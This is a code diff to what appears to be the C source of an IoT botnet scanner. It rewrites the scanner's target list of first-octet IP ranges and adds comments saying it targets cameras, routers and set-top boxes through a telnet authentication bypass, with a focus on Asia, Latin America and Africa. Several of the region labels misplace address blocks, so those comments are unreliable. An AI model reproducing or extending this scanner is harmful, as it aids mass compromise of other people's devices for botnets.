@@ -30,7 +30,30 @@ struct telnetbypass_scanner_auth *telnetbypass_auth_table = NULL;
 struct telnetbypass_scanner_connection *conn_table;
 uint16_t telnetbypass_telnetbypass_auth_table_max_weight = 0;
 uint32_t telnetbypass_fake_time = 0;
-int tlbypass_ranges[] = {223,222,221,220,219,218,217,213,212,211,210,203,202,201,200,199,198,197,196,195,194,193,192,191,190,189,188,187,186,185,184,183,182,181,180,179,178,177,176,175,174,173,172,171,170,169,168,167,166,165,164,163,162,161,160,159,158,157,156,155,154,153,126,125,124,123,122,121,120,119,118,117,116,115,114,113,112,111,110,109,108,107,106,105,104,103,102,101,95,94,93,92,91,90,89,88,87,86,85,84,83,82,81,80,63,62,61,60,59,58,57,56,55,54,53,52,51,50,49,48,47,46,45,44,43,42,41,40,39,38,37,36,27,14,2,1};
+/* Telnet bypass scanner IP ranges - targets IoT devices with telnet auth bypass
+ * Global coverage: All regions with IoT device deployments
+ * Focus: Asia, Latin America, Africa where IoT devices are prevalent
+ * Devices: Cameras, routers, set-top boxes with telnet enabled
+ */
+int tlbypass_ranges[] = {
+    /* Asia - IoT hotspot */
+    125,124,123,122,121,120,119,118,117,116,115,114,113,112,111,110,
+    109,108,107,106,105,104,103,102,101,
+    /* Latin America */
+    201,200,191,190,189,187,186,181,180,179,177,
+    /* Middle East */
+    95,94,93,92,91,90,89,88,87,86,85,84,83,82,81,80,
+    /* Africa */
+    197,196,195,194,193,192,165,164,163,162,161,160,159,158,157,156,155,154,153,
+    /* Europe */
+    79,78,77,76,75,74,73,72,71,70,69,68,67,66,65,64,63,
+    /* Asia-Pacific (Australia, Pacific) */
+    203,202,210,211,218,219,220,
+    /* North America */
+    62,61,60,59,58,57,56,55,54,53,52,51,50,49,48,47,46,45,44,43,42,41,40,
+    39,38,37,36,27,14,2,1,
+    -1
+};
 
 int telnetbypass_recv_strip_null(int sock, void *buf, int len, int flags)
 {
